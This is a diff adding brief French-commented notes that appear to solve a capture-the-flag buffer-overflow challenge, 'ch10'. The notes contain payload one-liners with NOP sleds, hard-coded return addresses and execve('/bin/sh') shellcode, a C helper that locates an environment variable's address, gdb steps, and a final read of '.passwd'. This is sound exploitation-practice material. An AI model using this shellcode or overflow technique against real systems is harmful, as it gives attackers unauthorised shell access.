@@ -1,0 +1,55 @@
+#overflow sur la variable username
+#on commence notre fichier par USERNAME=
+#au premier segv, on met une adresse valide pour continuer dans le code
+#shellcode dans l'env, on recupere l'adresse et on le met dans l'esi
+
+python -c "print 'USERNAME=' + '\x90'*136+'\x08\xb0\x04\x08'+'\x90'*28 + '\x58\xff\xff\xbf'" > /tmp/file
+./ch10 /tmp/file
+
+
+
+
+export boo=`python -c "print '\x90'* 50 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`
+cd /tmp
+vi c.c
+>>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+	char *ptr;
+
+	if(argc < 3) {
+		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
+		exit(0);
+	}
+	ptr = getenv(argv[1]); /* get env var location */
+	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
+	printf("%s will be at %p\n", argv[1], ptr);
+}
+<<
+gcc -o c c.c
+cd
+/tmp/c boo ch10
+boo will be at 0xbfffff1d
+
+gdb ch10
+> disassemble Init
+> b *0x08048680
+> r /tmp/file
+> x/4x $esp
+
+3eme argument pour le fd
+
+
+python -c "print 'USERNAME=' + '\x90'*136+'\x08\xb0\x04\x08'+'\x90'*28 + '\x1d\xff\xff\xbf'*2" > /tmp/file
+
+./ch10 /tmp/file
+
+
+python -c 'print "USERNAME="+"\x90"*108+"\x31\xc0\x89\xc2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"+"\x08\xb0\x04\x08"+"A"*28+"\x9a\xf9\xff\xbf"*2' > /tmp/file
+
+./ch10 /tmp/file
+cat .passwd
+
